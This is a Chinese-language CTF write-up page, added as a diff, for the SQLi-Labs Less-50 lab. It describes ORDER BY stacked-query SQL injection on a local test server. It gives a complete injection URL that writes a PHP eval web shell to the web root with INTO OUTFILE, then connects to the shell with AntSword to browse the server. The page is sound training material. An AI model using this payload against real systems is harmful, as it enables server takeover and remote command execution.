@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-50 ORDER BY 堆叠注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-50 ORDER BY 堆叠注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.28 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, ORDER BY注入, 堆叠注入, WebShell</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-50 (GET - ORDER BY - Stacked Query)</li>
+        <li><strong>提示：</strong>注入点为 <code>sort</code> 参数，纯数字型 <code>ORDER BY $id</code>，后端支持多语句执行。</li>
+    </ul>
+
+    <h2>2. 核心原理：ORDER BY 堆叠注入</h2>
+    <p>本关卡虽在 <code>ORDER BY</code> 处注入，但后端使用了 <code>mysqli_multi_query()</code>。这意味着我们可以利用分号 <code>;</code> 强行结束当前的排序查询，并开启一条全新的 SQL 语句。</p>
+    <p>由于不受列数和查询逻辑的限制，可以直接利用 <code>INTO OUTFILE</code> 将木马写入磁盘，实现从 SQL 注入到系统权限的突破。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：构造堆叠注入写马</strong></p>
+    <p><strong>输入 URL：</strong><code>?sort=1; select '<?php @eval($_POST["cmd"]); ?>' into outfile 'D:/phpstudy_pro/WWW/sqli-labs-master/Less-50/shell.php'-- -</code></p>
+    <p><strong>回显现象：</strong>页面正常渲染了原定的用户列表。这是因为原本的 <code>SELECT ... ORDER BY 1</code> 被正常执行并回显，而分号后面的写入语句属于“盲执行”。</p>
+
+    <p><strong>第二步：本地验证与蚁剑连接</strong></p>
+    <p>前往物理路径 <code>D:\phpstudy_pro\WWW\sqli-labs-master\Less-50\</code>，确认生成了 <code>shell.php</code>（1KB）。</p>
+    <p>打开中国蚁剑，新建数据：</p>
+    <ul>
+        <li><strong>URL 地址：</strong><code>http://localhost/sqli-labs-master/Less-50/shell.php</code></li>
+        <li><strong>连接密码：</strong><code>cmd</code></li>
+    </ul>
+    <p>连接成功后，进入文件管理界面，即可查看目标服务器的目录结构。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>回显错觉：</strong>在 <code>ORDER BY</code> 堆叠注入中，页面通常会正常显示数据，这是因为前端代码只处理了第一条 <code>SELECT</code> 的结果。写文件的操作虽然成功，但不会在页面抛出提示，必须依赖本地文件系统进行验证。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>堆叠注入的破坏力</strong>：突破了普通注入只能查询的限制，能够直接执行写文件、改表、甚至执行系统命令（若有相应函数权限）。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
